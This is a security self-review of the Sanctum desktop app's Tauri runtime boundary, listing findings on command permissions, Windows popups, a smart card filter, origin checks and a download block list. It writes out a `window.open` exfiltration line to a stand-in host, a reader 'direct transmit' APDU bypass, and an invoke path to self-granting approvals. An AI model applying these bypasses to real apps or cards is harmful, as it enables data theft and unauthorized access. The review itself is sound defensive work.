# Security review: does the Rust runtime widen the blast radius?

Date: 2026-11-03. Scope: the boundary between a tool and the rest of Sanctum, measured against
the plain alternative of opening the same HTML file in a browser. Reviewed by reading Sanctum's
code and the exact Tauri 2.11.2, tauri-runtime-wry 2.11.2, tauri-build 2.6.2 and wry 0.55.1
sources in `Cargo.lock`. This is a self-review, not an outside audit, and nothing below was run
against a live window unless it says so.

## Answer

For a tool with no approvals, Sanctum's blast radius is smaller than a browser tab's. A page
opened in a browser can reach the network, navigate anywhere and post forms. A Sanctum tool
gets a private origin, a policy that denies every fetch, navigation pinned to that origin, no
form targets, and an integrity check before every launch. The web engine is the same system
engine a browser would use, so a renderer exploit buys the same sandboxed process in both cases.

The Rust layer does add reach in three places, and those are where the findings sit:

1. **Sanctum's own commands.** The host process holds about fifty commands that install tools,
   change approvals, add registries and drive the Codex agent. Whether a tool window can call
   them is the single most important question in the model (F1).
2. **The smart card broker.** By design it gives a tool something no browser does: PC/SC access
   to an approved applet. Its filter had a gap (F3) and relies on a selection it does not own
   (F4).
3. **Windows.** Release builds ship for Windows, but the window confinement was written for the
   macOS and Linux form of the tool address (F2, F5).

## Findings

| | Finding | Severity | Status |
|---|---|---|---|
| F1 | Tool windows were not refused Sanctum's commands by any permission | High (defence in depth) | Fixed |
| F2 | `window.open` from a tool opens an unrestricted popup on Windows | High on Windows | Fixed |
| F3 | Smart card filter let reader commands (`CLA FF`) through | Medium | Fixed |
| F4 | Applet approval follows Sanctum's idea of the selection, not the card's | Medium | Open |
| F5 | Windows origin checks expect `*.localhost`; wry produces another form | Medium on Windows | Open |
| F6 | Smart card session lock is held during card I/O | Low | Open |
| F7 | Download refusal list misses some script and macro types | Low | Open |
| F8 | System web engine patch level, WebKitGTK in particular | Accepted | |

**F1. Commands were reachable in principle from tool windows (high, fixed).**
Tauri checks permissions on an app command only for plugin commands, for apps that declare their
commands, or for remote origins (`tauri/src/webview/mod.rs:1823`). Sanctum declared none, and a
custom scheme it registers, `sanctum-tool://`, counts as a local origin. So
`capabilities/tool-default.json` with no permissions blocked plugins only. The script that hides
Tauri's globals cannot hide `__TAURI_INTERNALS__`: Tauri defines it as non-configurable first, so
the redefinition throws and is caught. Every tool therefore had `__TAURI_INTERNALS__.invoke`.

What kept a call from landing was the isolation pattern. Each message must be encrypted with a
key that lives in the `isolation://` frame, and a tool's `frame-src 'none'` keeps that frame from
loading. That held, but it was a side effect of the content policy rather than a permission, and
any later change that loaded the frame (a capability that relaxes `frame-src`, an engine bug, the
Windows address in F5) would have let a tool call `update_approvals` and grant itself any host
or applet.

Fix: `build.rs` declares every command, `main.json` grants all of them, `create.json` grants the
agent commands its chat uses, and `tool-default.json` still grants nothing. Two tests pin this:
one fails if a command is added to the handler without being declared, the other fails if a
capability other than `tool-default` reaches `tool-*` or names a remote origin. The comment on
the hiding script now says it is not the control.

**F2. `window.open` on Windows (high on Windows, fixed).**
No new-window handler was set, and Tauri installs none of its own
(`tauri-runtime-wry/src/lib.rs:4907`). WebView2 then opens the request in a popup that has none
of the tool's policy and is not covered by `on_navigation`, so `window.open("https://x/?" + data)`
would send data out. macOS and Linux refuse when no handler is set.
Fix: tool and draft windows deny every new window on every platform.

**F3. Reader commands through the smart card bridge (medium, fixed).**
The filter checked only interindustry commands, so class `FF`, which PC/SC readers take as a
command for the reader itself, passed. On readers such as the ACR122U a "direct transmit"
(`FF 00 00 00 … D4 40 01 <apdu>`) wraps any APDU, a SELECT of PIV or a payment applet included.
Fix: class `FF` is refused whatever the instruction, with a test.

**F4. The card's selection is shared (medium, open).**
Sessions connect in shared mode so Sanctum does not lock the user out of their own card. Between
two transactions another program (scdaemon, CryptoTokenKit, OpenSC) can select PIV on the basic
channel, and the tool's next command reaches PIV, possibly with a PIN that program already
verified. Commands that are not SELECT, sent on logical channels 1 to 19 (the low bits of the
class byte), also reach whatever another program selected there.
Proposed fix: refuse any class byte that encodes a non-zero channel, and re-select the approved
applet at the start of each transaction before the tool's command, except for the CTAP
keep-alive continuation, which a re-select would break. This needs testing with real CTAP2 over
NFC before it ships, so it is left for a separate change.

**F5. Windows tool address (medium on Windows, open).**
wry rewrites `sanctum-tool://tool-X/` to `http://sanctum-tool.tool-X/` on Windows
(`wry/src/custom_protocol_workaround.rs`). `is_allowed_tool_navigation` and
`downloads::own_origin` instead accept any `*.localhost` address, which likely blocks the tool's
own page while allowing the main interface (`tauri.localhost`) and the isolation page. The same
address is not a loopback host, so a tool is probably not a secure context there either.
Proposed fix: match the exact host, then run a tool on a real Windows machine. Until then,
Windows is untested, as the 0.2.0 review already says.

**F6. Session lock during card I/O (low, open).** One tool's exchange, up to 32 rounds of
response chaining, holds the lock every other tool's broker call needs. Denial of service only.

**F7. Download refusal list (low, open).** Missing: `.applescript`, `.scptd`, macro-enabled
Office files (`.docm`, `.xlsm`, `.pptm`), `.msc`, `.library-ms`, `.settingcontent-ms`, `.xll`,
`.iqy`, `.sct`, `.wsc`. A browser downloads anything, so this is still no wider than a browser,
provided the system's downloaded-file mark is applied. That mark has not been checked on Windows.

**F8. System web engine (accepted).** WKWebView follows macOS updates, WebView2 updates itself,
and WebKitGTK follows the Linux distribution, which often lags. A renderer exploit in a tool gets
what it would get in a browser tab, but on an engine that may be older than the user's browser.

## What holds

- Path handling in the tool protocol (`normalize_within`) and tool identity, which comes from the
  window label the runtime sets, not from anything the page sends.
- One origin per tool, and a baseline policy that denies every fetch directive and `form-action`.
- Navigation confined to the tool's own origin on macOS and Linux.
- Approvals fixed at launch, and broker sessions bound to the tool that opened them.
- Single-file bundles, so no symbolic links inside a tool directory.
- The Codex agent, reachable only from the main and Create windows, which its commands also
  check by label.

## Still owed

1. F4, with CTAP2 over NFC tested on real hardware.
2. F5 and F2 confirmed on a real Windows machine, together with the items owed from 0.2.0.
3. A live check on each platform that `__TAURI_INTERNALS__.invoke("list_tools")` from a tool
   window is refused with "not allowed by ACL".
